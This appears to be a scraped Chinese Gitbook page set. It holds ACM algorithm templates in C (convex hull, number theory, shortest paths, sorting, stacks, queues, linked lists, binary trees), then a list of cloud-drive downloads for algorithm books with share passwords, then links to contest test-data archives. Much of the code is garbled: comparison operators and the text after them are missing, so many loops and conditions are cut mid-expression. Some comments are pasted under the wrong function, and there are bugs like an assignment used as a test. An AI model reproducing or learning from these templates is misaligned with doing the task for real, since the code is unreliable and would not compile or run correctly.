*p：封闭曲线顶点数组 n：封闭曲线顶点个数 返回值： 1：凸集 -1：凹集 0：曲线不符合要求无法计算 注意： 默认曲线为简单曲线：无交叉、无圈 源程序： */ typedef struct { double x, y; } Point; int convex( Point *p, int n ) { int i, j, k; int flag = 0; double z; if ( n 0 ) flag |= 2; if ( flag == 3 ) return(1); /* CONCAVE */ } if ( flag != 0 ) return(1); /* CONVEX */ else return(0); } Graham扫描法寻找凸包 /* 语法：Graham_scan( Point PointSet[], Point ch[], int n, int &len ); 参数： PointSet[]：输入的点集 ch[]：输出的凸包上的点集，按照逆时针方向排列 n：PointSet中的点的数目 len：输出的凸包上的点的个数 返回值： null 源程序： */ struct Point { float x, y; }; float multiply( Point p1, Point p2, Point p0 ) { return( (p1.x - p0.x) * (p2.y - p0.y) - (p2.x - p0.x) * (p1.y - p0.y) ); } float distance( Point p1, Point p2 ) { return(sqrt( (p1.x - p2.x) * (p1.x - p2.x) + (p1.y - p2.y) * (p1.y - p2.y) ) ); } void Graham_scan( Point PointSet[], Point ch[], int n, int &len ) { int i, j, k = 0, top = 2; Point tmp; for ( i = 1; i 0) || ( (multiply( PointSet[j], PointSet[k], PointSet[0] ) == 0) && (distance( PointSet[0], PointSet[j] ) = 0 ) top--; ch[++top] = PointSet[i]; } len = top + 1; } 数论 x的二进制长度 /* 语法：result = BitLength( int x ); 参数： x：测长的x 返回值： x的二进制长度 源程序： */ int BitLength( int x ) { int d = 0; while ( x > 0 ) { x >>= 1; d++; } return(d); } 返回x的二进制表示中从低到高的第i位 /* 语法：result = BitAt( int x, int i ); 参数： x：十进制 x i：要求二进制的第i位 返回值： 返回x的二进制表示中从低到高的第i位 注意： 最低位为第一位 源程序： */ int BitAt( int x, int i ) { return(x & (1 模取幂运算 /* 语法：result = Modular_Expoent( int a, int b, int n ); 参数： a、b、n：a^b mod n 的对应参数 返回值： a^b mod n 的值 注意： 需要BitLength和BitAt 源程序： */ int Modular_Expoent( int a, int b, int n ) { int i, y = 1; for ( i = BitLength( b ); i > 0; i-- ) { y = (y * y) % n; if ( BitAt( b, i ) > 0 ) y = (y * a) % n; } return(y); } 求解模线性方程 /* 语法：result ＝ modular_equation( int a, int b, int n ); 参数： a、b、n：ax=b (mod n) 的对应参数 返回值： 方程的解 源程序： */ int ext_euclid( int a, int b, int &x, int &y ) /* 求gcd(a,b)=ax+by */ { int t, d; if ( b == 0 ) { x = 1; y = 0; return(a); } d = ext_euclid( b, a % b, x, y ); t = x; x = y; y = t - a / b * y; return(d); } void modular_equation( int a, int b, int n ) { int e, i, d; int x, y; d = ext_euclid( a, n, x, y ); if ( b % d > 0 ) printf( \"No answer!\\n\" ); else{ e = (x * (b / d) ) % n; for ( i = 0; i 求解模线性方程组(中国余数定理) /* 语法：result = Modular_Expoent( int a, int b, int n ); 参数： B[]、W[]：a=B[] (mod W[]) 的对应参数 返回值： a 的值 注意： 其中W[],B[]已知，W[i]>0且W[i]与W[j]互质, 求a 源程序： */ int ext_euclid( int a, int b, int &x, int &y ) /* 求gcd(a,b)=ax+by */ { int t, d; if ( b == 0 ) { x = 1; y = 0; return(a); } d = ext_euclid( b, a % b, x, y ); t = x; x = y; y = t - a / b * y; return(d); } int China( int B[], int W[], int k ) { int i; int d, x, y, a = 0, m, n = 1; for ( i = 0; i 0 ) return(a); else return(a + n); } 筛法素数产生器 /* 语法：result = prime( int a[], int n ); 参数： a[]：用于返回素数的数组 n：产生n以内的素数，按升序放入a[]中 返回值： n以内素数的个数 注意： 其中W[],B[]已知，W[i]>0且W[i]与W[j]互质, 求a 源程序： */ int prime( int a[], int n ) { int i, j, k, x, num, *b; n++; n /= 2; b = (int *) malloc( sizeof(int) * (n + 1) * 2 ); a[0] = 2; a[1] = 3; num = 2; for ( i = 1; i 判断一个数是否素数 /* 语法：result = comp( int n ); 参数： n：判断n是否素数 返回值： 素数返回1，否则返回0 源程序： */ int comp( int n ) { int i, flag = 1; for ( i = 2; i 图论 Prim算法求最小生成树 /* 语法：prim( Graph G, int vcount, int father[] ); 参数： G：图，用邻接矩阵表示 vcount：表示图的顶点个数 father[]：用来记录每个节点的父节点 返回值： null 注意： 常数max_vertexes为图最大节点数 常数infinity为无穷大 源程序： */ #define infinity 1000000 #define max_vertexes 5 typedef int Graph[max_vertexes][max_vertexes]; void prim( Graph G, int vcount, int father[] ) { int i, j, k; int lowcost[max_vertexes], closeset[max_vertexes], used[max_vertexes]; for ( i = 0; i Dijkstra算法求单源最短路径 /* 语法：result = Dijkstra( Graph G, int n, int s, int t, int path[] ); 参数： G：图，用邻接矩阵表示 n：图的顶点个数 s：开始节点 t：目标节点 path[]：用于返回由开始节点到目标节点的路径 返回值： 最短路径长度 注意： 输入的图的权必须非负 顶点标号从0开始 用如下方法打印路径： i = t; while ( i != s ) { printf( \"%d= d[j]) ) { minc = d[j]; w = j; } mark[w] = 1; for ( j = 0; j d[w] + G[w][j]) ) { d[j] = d[w] + G[w][j]; path[j] = w; } } return(d[t]); } Bellman-ford算法求单源最短路径 /* 语法：result = Bellman_ford( Graph G, int n, int s, int t, int path[], int success ); 参数： G：图，用邻接矩阵表示 n：图的顶点个数 s：开始节点 t：目标节点 path[]：用于返回由开始节点到目标节点的路径 success：函数是否执行成功 返回值： 最短路径长度 注意： 输入的图的权可以为负，如果存在一个从源点可达的权为负的回路则success=0 顶点标号从0开始 用如下方法打印路径： i = t; while ( i != s ) { printf( \"%d d[i] + G[i][j] ) { d[j] = d[i] + G[i][j]; path[j] = i; } success = 0; for ( i = 0; i d[i] + G[i][j] ) return(0); success = 1; return(d[t]); } Floyd算法求每对节点间最短路径 /* 语法：Floyd_Washall( Graph G, int n, Graph D, Graph P ); 参数： G：图，用邻接矩阵表示 n：图的顶点个数 D：D[i,j]表示从i到j的最短距离 P：P[i,j]表示从i到j的最短路径上j 的父节点 返回值： null 源程序： */ void Floyd_Washall( Graph G, int n, Graph D, Graph P ) { int i, j, k; for ( i = 0; i D[i][k] + D[k][j] ) { D[i][j] = D[i][k] + D[k][j]; P[i][j] = P[k][j]; } } 排序/搜索 快速排序 /* 语法：quicksort( int l, int r, int b[] ); 参数： l：排序上界，开始时l=0 r：排序下界，开始时r=数组元素个数 b[]：被排序的元素 返回值： null 注意： 输出升序序列 源程序： */ void quicksort( int l, int r, int b[] ) { int i, j, x; if ( l >= r ) return; i = l; j = r; x = b[i]; while ( i != j ) { while ( b[j] > x && j > i ) j--; if ( i i ) i++; if ( i 希尔排序 /* 语法：shellsort( int a[], int n ); 参数： n：数组元素个数 a[]：待排序数组 返回值： null 注意： 输出升序序列 源程序： */ void shellsort( int a[], int n ) { int i, j, g; int temp, k; g = n / 2; while ( g != 0 ) { for ( i = g + 1; i 0 ) { k = j + g; if ( a[j] 选择排序 /* 语法：sort( int t[], int n ); 参数： t[]：待排序数组 n：数组t[]元素的个数 返回值： null 注意： 输出升序序列 小规模排序用 源程序： */ void sort( int t[], int n ) { int i, j, k, temp; for ( i = 0; i 二分查找 /* 语法：result = search_bin( int *t, int k ); 参数： t[]：待查找数组 k：查找关键字 返回值： 如果k在t[]中存在，输出i：t[i]=k，否则输出－1 注意： 要求查找数组是有序升序序列 源程序： */ int search_bin( int *t, int k ) { int low = 1, high = 10, mid; while ( low 数据结构 顺序队列 /* 源程序： */ #define maxsize 100 typedef struct { int data[maxsize]; int front; int rear; } sqqueue; int sqinit( sqqueue *p ) /* 队列初始化 */ { p->front = 0; p->rear = 0; return(1); } int enqueue( sqqueue *q, int e ) /* 入队 */ { if ( (q->rear + 1) % maxsize == q->front ) return(0); else q->data[q->rear] = e; q->rear = (q->rear + 1) % maxsize; return(1); } int dequeue( sqqueue *q ) /* 出队 */ { int e; if ( q->front == q->rear ) return(0); e = q->data[q->front]; q->front = (q->front + 1) % maxsize; return(e); } int empty( sqqueue *q ) /* 判空 */ { int v; if ( q->front == q->rear ) v = 1; else v = 0; return(v); } int gethead( sqqueue *q ) /* 取得头元素 */ { int e; if ( q->front == q->rear ) e = -1; else e = q->data[q->front]; return(e); } void display( sqqueue *q ) /* 显示所有元素 */ { int s; s = q->front; printf( \"the sequeue is display:\\n\" ); if ( q->front == q->rear ) printf( \"the sequeue is empty!\" ); else{ while ( s rear ) { printf( \"->%d\", q->data[s] ); s = (s + 1) % maxsize; } printf( \"\\n\" ); } } main( sqqueue * head ) /* 函数使用样例 */ { int n, i, m, x, y, select, xq; printf( \"create a empty sequeue\\n\" ); sqinit( head ); printf( \"please input the sequeue length:\\n\" ); scanf( \"%d\", &n ); for ( i = 0; i rear:%d\\n\", head->rear ); printf( \"head->front:%d\\n\", head->front ); display( head ); printf( \"select 1 **** enqueue() \\n\" ); printf( \"select 2 **** dequeue() \\n\" ); printf( \"select 3 **** empty () \\n\" ); printf( \"select 4 **** gethead() \\n\" ); printf( \"select 5 **** display() \\n\" ); printf( \"please select (1--5):\" ); scanf( \"%d\", &select ); switch ( select ) { case 1: { printf( \"please input a value :\\n \" ); scanf( \"%d\", &x ); enqueue( head, x ); display( head ); break; } case 2: { dequeue( head ); display( head ); break; } case 3: { if ( empty( head ) ) printf( \"the sequeue is empty\" ); else printf( \"the sequeue is full\" ); } case 4: { y = gethead( head ); printf( \"output head value:%d\\n\", y ); break; } case 5: { display( head ); break; } } } } 顺序栈 /* 源程序： */ #define m 100 typedef struct { int stack[m]; int top; } stackstru; init( stackstru * s ) /*装入栈*/ { s->top = 0; return(1); } int push( stackstru *s, int x ) /*入栈操作*/ { if ( s->top == m ) printf( \"the stack is overflow!\\n\" ); else{ s->top = s->top + 1; s->stack[s->top] = x; } } void display( stackstru *s ) /*显示栈所有数据*/ { if ( s->top == 0 ) printf( \"the stack is empty!\\n\" ); else{ while ( s->top != 0 ) { printf( \"%d->\", s->stack[s->top] ); s->top = s->top - 1; } } } int pop( stackstru *s ) /*出栈操作并返回被删除的那个记录*/ { int y; if ( s->top == 0 ) printf( \"the stack is empty!\\n\" ); else{ y = s->stack[s->top]; s->top = s->top - 1; return(y); } } int gettop( stackstru *s ) /*得到栈顶数*/ { int e; if ( s->top == 0 ) return(0); else e = s->stack[s->top]; return(e); } main( stackstru * p ) /* 函数使用演示 */ { int n, i, k, h, x1, x2, select; printf( \"create a empty stack!\\n\" ); init( p ); printf( \"input a stack length:\\n\" ); scanf( \"%d\", &n ); for ( i = 0; i %d\\n\", x1 ); display( p ); break; } case 4: { x2 = gettop( p ); printf( \"x2->%d\", x2 ); break; } } } 链表 /* 源程序： */ #define null 0 typedef char ElemType; /* 字符型数据*/ typedef struct LNode { ElemType data; struct LNode *next; }; setnull( struct LNode **p ); int length( struct LNode **p ); ElemType get( struct LNode **p, int i ); void insert( struct LNode **p, ElemType x, int i ); int delete( struct LNode **p, int i ); void display( struct LNode **p ); main() { struct LNode *head, *q; /*定义静态变量*/ int select, x1, x2, x3, x4; int i, n; int m, g; char e, y; head = setnull( &head ); /*建议链表并设置为空表*/ printf( \"请输入数据长度: \" ); scanf( \"%d\", &n ); for ( i = 1; i next; } return(n); } ElemType get( struct LNode **p, int i ) { int j = 1; struct LNode *q = *p; while ( j next; j++; } if ( q != null ) return(q->data); else printf( \"位置参数不正确!\\n\" ); } int locate( struct LNode **p, ElemType x ) { int n = 0; struct LNode *q = *p; while ( q != null && q->data != x ) { q = q->next; n++; } if ( q == null ) return(-1); else return(n + 1); } void insert( struct LNode **p, ElemType x, int i ) { int j = 1; struct LNode *s, *q; s = (struct LNode *) malloc( sizeof(struct LNode) ); s->data = x; q = *p; if ( i == 1 ) { s->next = q; p = s; }else { while ( j next != null ) { q = q->next; j++; } if ( j == i - 1 ) { s->next = q->next; q->next = s; }else printf( \"位置参数不正确!\\n\" ); } } int delete( struct LNode **p, int i ) { int j = 1; struct LNode *q = *p, *t; if ( i == 1 ) { t = q; *p = q->next; }else { while ( j next != null ) { q = q->next; j++; } if ( q->next != null && j == i - 1 ) { t = q->next; q->next = t->next; }else printf( \"位置参数不正确!\\n\" ); } if ( t = null ) free( t ); } void display( struct LNode **p ) { struct LNode *q; q = *p; printf( \"单链表显示: \" ); if ( q == null ) printf( \"链表为空!\" ); else if ( q->next == null ) printf( \"%c\\n\", q->data ); else{ while ( q->next != null ) { printf( \"%c->\", q->data ); q = q->next; } printf( \"%c\", q->data ); } printf( \"\\n\" ); } 链栈 /* 源程序： */ #define null 0 typedef struct stacknode { int data; struct stacknode *next; } stacklink; typedef struct { stacklink *top; int stacksize; }stackk; initlink( stackk * s ) { s->top = (stacklink *) malloc( sizeof(stacklink) ); s->top->data = 0; s->top->next = null; } int poplink( stackk *s ) { stackk *p; int v; if ( s->top->next == null ) printf( \"the stackis empty\\n\" ); else{ v = s->top->next->data; p = s->top->next; s->top = s->top->next; } free( p ); return(v); } int pushlink( stackk *s, int x ) { stackk *p; p = (stacklink *) malloc( sizeof(stacklink) ); p->data = x; p->next = s->top->next; s->top->next = p; } int gettop( stackk *s ) { int e; if ( s == null ) printf( \"the stack is empty!\\n\" ); e = s->top->next->data; return(e); } display( stackk * s ) { stackk *p; p = s->top->next; printf( \"display the stacklink:\\n\" ); if ( s->top = null ) printf( \"the stacklink is empty!\\n\" ); else{ while ( p ) { printf( \"->%d\", p->data ); p = p->next; } } } main( stacklink * p ) { int n, k, i, select, h, x1, x2; printf( \"create a empty stacklink!\\n\" ); initlink( p ); printf( \"input a stacklink length:\\n\" ); scanf( \"%d\", &n ); for ( i = 1; i %d\\n\", x1 ); display( p ); break; } case 4: { x2 = gettop( p ); printf( \"x2->%d\", x2 ); break; } } } 二叉树 /* 源程序 */ typedef struct bitnode { char data; struct bitnode *lchild, *rchild; }bitnode, *bitree; void createbitree( bitnode **t, int *n ) { char x; bitnode *q; *n = *n + 1; printf( \"\\n Input %d DATA:\", *n ); x = getchar(); if ( x != '\\n' ) getchar(); if ( x == '\\n' ) return; q = (bitnode *) malloc( sizeof(bitnode) ); q->data = x; q->lchild = NULL; q->rchild = NULL; *t = q; printf( \" This Address is: %o, Data is: %c,\\n Left Pointer is: %o, Right Pointer is: %o\", q, q->data, q->lchild, q->rchild ); createbitree( &q->lchild, n ); createbitree( &q->rchild, n ); return; } void visit( bitnode *e ) { printf( \" Address: %o, Data: %c, Left Pointer: %o, Right Pointer: %o\\n\", e, e->data, e->lchild, e->rchild ); } void preordertraverse( bitnode *t ) { if ( t ) { visit( t ); preordertraverse( t->lchild ); preordertraverse( t->rchild ); return; }else return; } void countleaf( bitnode *t, int *c ) { if ( t != NULL ) { if ( t->lchild == NULL && t->rchild == NULL ) { *c = *c + 1; } countleaf( t->lchild, c ); countleaf( t->rchild, c ); } return; } int treehigh( bitnode *t ) { int lh, rh, h; if ( t == NULL ) h = 0; else{ lh = treehigh( t->lchild ); rh = treehigh( t->rchild ); h = (lh > rh ? lh : rh) + 1; } return(h); } main() { bitnode *t; int count = 0; int n = 0; printf( \"\\n Please input TREE Data:\\n\" ); createbitree( &t, &n ); printf( \"\\n This is TREE struct: \\n\" ); preordertraverse( t ); countleaf( t, &count ); printf( \"\\n This TREE has %d leaves \", count ); printf( \" , High of The TREE is: %d\\n\", treehigh( t ) ); } Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/acm/ACM绝版资源公开.html":{"url":"markdown/technical/algorithm/acm/ACM绝版资源公开.html","title":"ACM 绝版资源公开","keywords":"","body":"ACM绝版资源公开： 参考书、模板、讲义、指导经典参考书算法模板课件讲义专题指导ACM绝版资源公开： 参考书、模板、讲义、指导 经典参考书 资源 简介 下载 《算法导论（中文第二版）》 案头必备的算法字典 腾讯微云密码：ibyf9v 《算法导论（英文第二版）》 案头必备的算法字典 腾讯微云密码：bc4dhq 《程序设计导引及在线实践》 POJ封面书（北大教材） 腾讯微云密码：qixuwr 《算法艺术与信息学竞赛》 ACM著名黑书之一（刘汝佳） 腾讯微云密码：qrv6hx 《算法艺术与信息学竞赛》学习指导（上） 配套资源 腾讯微云密码：5cucs4 《算法艺术与信息学竞赛》学习指导（下） 配套资源 腾讯微云密码：vhch6d 《实用算法的分析与程序设计》 ACM著名黑书之一（吴文虎） 腾讯微云密码：s7rbxc 《实用算法基础教程》 - 腾讯微云密码：nx6ty7 《The Art Of Computer Programming》 - 腾讯微云密码：3anj9p 算法模板 资源 简介 下载 《ACM常用算法模板》 ACM小组内部预定函数 在线阅读腾讯微云密码：qbup8c 《ACM模板（浙大）》 浙江大学（2002-2004） 腾讯微云密码：y538n3 《基本算法模块》 NOIP（2007） 腾讯微云密码：7vahp6 《晋级算法模板》 NOIP（2007） 腾讯微云密码：wg5f99 《ACM/ICPC代码库》 吉林大学（2007-2008） 腾讯微云密码：4r5x6v 《上海交大ACM模板》 上海交通大学（2009） 腾讯微云密码：ii49nq 《ICPC算法册》 佛山大学（2010） 腾讯微云密码：48nfqm 《中山大学ACM模板》 中山大学（2010） 腾讯微云密码：uib6yg 《计算几何算法模板（第一版）》 计算机和函数库（2011） 腾讯微云密码：pfgdv5 《经典算法及试题举例程序》 2013 腾讯微云密码：g34mn7 《N皇后问题构造法模板》 N皇后构造法公式（2017） 在线阅读CSDN 课件讲义 资源 简介 下载 《ACM试题讲解》 ACM介绍 与 试题实例剖析 腾讯微云密码：nbrhib 《浙大ACM课件》 数学，递推关系，排列组合，动态规划，贪心算法，计算几何，搜索，二分图 腾讯微云密码：nxdy7e 《ACM国家集训队论文合集》 1999-2009 论文目录 腾讯微云密码：m9xwtc 《C语言经典算法》 基础算法，经典问题，有趣的小程序代码 腾讯微云密码：pcuapy 《曹利国培训资料》 枚举，贪心，分治，模拟，搜索，动态规划，数据结构 腾讯微云密码：bnake8 《试题选讲》 基础算法，字符串算法，数学，图论，约瑟夫问题 腾讯微云密码：ysde8c 专题指导 资源 简介 下载 经典算法 汉诺塔问题，皇后问题 腾讯微云密码：gnvqmk 数据结构 哈希，跳表，并查集，树状数组，平衡树，查找树，线段树，左偏树，二叉树 腾讯微云密码：4p47wd 捜索 BFS，DFS，递归与回溯，分支界限法，局部搜索，枚举，优先队列，骑士巡游，二叉搜索树 腾讯微云密码：239knc 排序 O(n^2)：选择排序，插入排序，冒泡排序O(n\\sqrt(n))：Shell增量排序（希尔排序）O(nlogn)：归并排序，堆排序，快速排序O(d*(n+m))：计数排序，桶排序，基数排序 腾讯微云密码：nrvvsa 数学 离散，整数分解，递推，GCD，法莱数列，欧拉函数，同余方程，素数，矩阵，开方，数制转化，位运算 腾讯微云密码：wcb9dj 高精度数处理 高精度整数，大数分解 腾讯微云密码：7hzzai 贪心算法 - 腾讯微云密码：4kqkz5 字符串处理 KMP算法，后缀数组 腾讯微云密码：qm69by 图论 PetriNet，网络流，SPFA，最小生成树，拓扑排序 腾讯微云密码：9d83p8 计算几何 凸包，矢量，交点，点线面形的关系 腾讯微云密码：w7axmh 并行算法 - 腾讯微云密码：44wmaa 动态规划 DP，背包，状态压缩，记忆化搜索，LCS，LDS，LIS 腾讯微云密码：4iwy9y 分治法 - 腾讯微云密码：bcwiak 博弈论 - 腾讯微云密码：ig3mux NP难问题 N&NP不等证明，蚁群算法 腾讯微云密码：7zfbef 其他 Ramsey定理，模拟策略，RMQ与LCA问题，Stirling逼近，阶乘，回文，随机算法 腾讯微云密码：9grc4y Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/acm/ACM测试数据合集.html":{"url":"markdown/technical/algorithm/acm/ACM测试数据合集.html","title":"ACM 测试数据合集","keywords":"","body":"ACM 测试数据合集地区赛USACO日本ACM比赛官方网站德国的Greater New York RegionWaterloo Programming ContestsUniversity of Ulm Local ContestStanford Local Programming ContestNordic Collegiate Programming ContestMid-Central USA programming contestSouth Central USANortheastern Europe RegionalNorthwestern European RegionalPacific NorthwestSouthEastern European RegionCTU OPENCentral European Regional ContestMid-Central European Regional ContestWestern and SouthWestern European Regional ContestCenter American RegionalsNorth Certral RegionalsIndex by ContestsFull ListA_FINALSB_EU_AARCB_EU_CERCB_EU_MCRCB_EU_NERCB_EU_NWRCB_EU_SARCB_EU_SERCB_EU_SWERCB_US_CentAmB_US_EastCenB_US_GreatNYB_US_MidAtlB_US_MidCenB_US_NorthCenB_US_NorthEastB_US_PacNWB_US_RockyB_US_SouthAmeB_US_SouthCalB_US_SouthCenB_US_SouthEasB_VV_AsianB_VV_SouthPacC_LO_ETHC_LO_NotreACM 测试数据合集 [!NOTE|style:flat|label:注意] 本文部分链接可能已失效 测试数据仅供参考调试之用 希望各位同学不要用来刷题 地区赛 http://icpc.baylor.edu/past/icpc2003/regionals/report.html USACO 2006年November题目和测试数据的网址：http://ace.delos.com/NOV06 2007年open赛题目和测试数据的网址：http://ace.delos.com/OPEN07 以此类推 日本ACM比赛 http://www.acm-japan.org/ http://icpc2010.honiden.nii.ac.jp/en/past-contests 官方网站 02年网址：http://icpc.baylor.edu/past/icpc2002/regionals/report.html 03年以后改2002到2003即可。部分有测试数据 德国的 里面有很多欧洲的比赛还有一些大学内部的比赛：http://www.informatik.uni-ulm.de/acm/index.html Greater New York Region http://acmgnyr.org/year2009/problems.shtml Waterloo Programming Contests http://plg1.cs.uwaterloo.ca/~acm00/ University of Ulm Local Contest http://www.informatik.uni-ulm.de/acm/Locals/2000/ 其他年份改变后面的2000即可 Stanford Local Programming Contest http://ai.stanford.edu/~chuongdo/acm/2006/ Nordic Collegiate Programming Contest http://ncpc.idi.ntnu.no/ Mid-Central USA programming contest http://mcpc.cigas.net/archives.html South Central USA http://contest.csc.lsu.edu/ Northeastern Europe Regional http://neerc.ifmo.ru/past/index.html Northwestern European Regional http://2010.nwerc.eu/ Pacific Northwest http://www.acmicpc-pacnw.org/results.htm SouthEastern European Region http://acm.ro/ CTU OPEN http://contest.felk.cvut.cz/related.html http://contest.felk.cvut.cz/ Central European Regional Contest http://contest.felk.cvut.cz/07cerc/ Mid-Central European Regional Contest http://contest.felk.cvut.cz/07cerc/ Western and SouthWestern European Regional Contest http://contest.felk.cvut.cz/07cerc/ Center American Regionals http://contest.felk.cvut.cz/07cerc/ North Certral Regionals http://contest.felk.cvut.cz/07cerc/ Index by Contests http://www.ntnu.edu.tw/acm/#A_FINALS http://www.ntnu.edu.tw/acm/#B_EU_AARC http://www.ntnu.edu.tw/acm/#B_EU_CERC http://www.ntnu.edu.tw/acm/#B_EU_MCRC http://www.ntnu.edu.tw/acm/#B_EU_NERC http://www.ntnu.edu.tw/acm/#B_EU_NWRC http://www.ntnu.edu.tw/acm/#B_EU_SARC http://www.ntnu.edu.tw/acm/#B_EU_SERC http://www.ntnu.edu.tw/acm/#B_EU_SWERC http://www.ntnu.edu.tw/acm/#B_US_CentAm http://www.ntnu.edu.tw/acm/#B_US_EastCen http://www.ntnu.edu.tw/acm/#B_US_GreatNY http://www.ntnu.edu.tw/acm/#B_US_MidAtl http://www.ntnu.edu.tw/acm/#B_US_MidCen http://www.ntnu.edu.tw/acm/#B_US_NorthCen http://www.ntnu.edu.tw/acm/#B_US_NorthEast http://www.ntnu.edu.tw/acm/#B_US_PacNW http://www.ntnu.edu.tw/acm/#B_US_Rocky http://www.ntnu.edu.tw/acm/#B_US_SouthAme http://www.ntnu.edu.tw/acm/#B_US_SouthCal http://www.ntnu.edu.tw/acm/#B_US_SouthCen http://www.ntnu.edu.tw/acm/#B_US_SouthEas http://www.ntnu.edu.tw/acm/#B_VV_Asian http://www.ntnu.edu.tw/acm/#B_VV_SouthPac http://www.ntnu.edu.tw/acm/#C_LO_ETH http://www.ntnu.edu.tw/acm/#C_LO_Notre Full List A_FINALS http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1991/index.html (Rich Text Format (RTF), binhex of Macintosh MS Word, ASCII text and HTML; unofficial sample solutions in C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1992/index.html (Rich Text Format (RTF), binhex of Macintosh MS Word, plain ASCII text and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1993/index.html (Rich Text Format (RTF), binhex of Macintosh MS Word, plain ASCII text and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1994/index.html (Rich Text Format (RTF), binhex of Macintosh MS Word, plain ASCII text and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1995/index.html (Rich Text Format (RTF), binhex of Macintosh MS Word, plain ASCII text and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1996/index.html (HTML, Rich Text Format (RTF), binhex of Macintosh MS Word, plain ASCII text and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1997/index.html (Postscript and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1998/index.html (PDF, Postscript and HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/1999/index.html (PDF, Postscript and Microsoft Word) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/A_FINALS/2001/index.html (PDF) B_EU_AARC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_AARC/1998/index.html (Problem set in HTML, and solutions in C) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_AARC/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_AARC/2001/index.html (PDF) B_EU_CERC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/1995/index.html (Problem Set in Postscript; tgz file with Problem Set in HTML, sample solution and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/1996/index.html (Problem Set in Postscript; tgz file with Problem Set in HTML, sample solution and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/1997/index.html (Problem Set in Postscript; tgz file with Problem Set in HTML, sample solution and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/1998/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/1999/index.html (Problem set in HTML, sample solutions in C/pascal and test data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/2000/index.html (Problem set in HTML, test data and sample solutions in C and pascal) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_CERC/2001/index.html (PDF and PS) B_EU_MCRC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_MCRC/1999/index.html (Problems in PostScript, sample input and output data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_MCRC/2000/index.html (Problems in PostScript and PDF; sample input and output data) B_EU_NERC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/1996/index.html (Problem sets in HTML, test data and sample solutions) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/1997/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/1998/index.html (Problem Set in RTF, sample solutions in Pascal and test data (ZIPped)) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/1999/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/2000/index.html (Problem set in HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NERC/2001/index.html (Problem sets in PDF; sample test data and checker's sources (rar) ) B_EU_NWRC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1989/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1992/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1993/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1994/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1995/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1996/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1997/index.html (PS and PDF ) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1998/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/2000/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_NWRC/2001/index.html (Problem set in PDF and test input/output data ) B_EU_SARC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SARC/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SARC/2000/index.html (Problem Set in PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SARC/2001/index.html (Problem set in PDF and test data) B_EU_SERC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/1995/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/1996/index.html (HTML) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/1997/index.html (PostScript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/1998/index.html (PostScript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/1999/index.html (PDF) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/2000/index.html (Problem set in doc; test input and output data) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SERC/2001/index.html (.doc) B_EU_SWERC http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1993/index.html (Postscript) http://www.ntnu.edu.tw/acm/ProblemSetArchive/B_EU_SWERC/1994/index.html (Postscript) 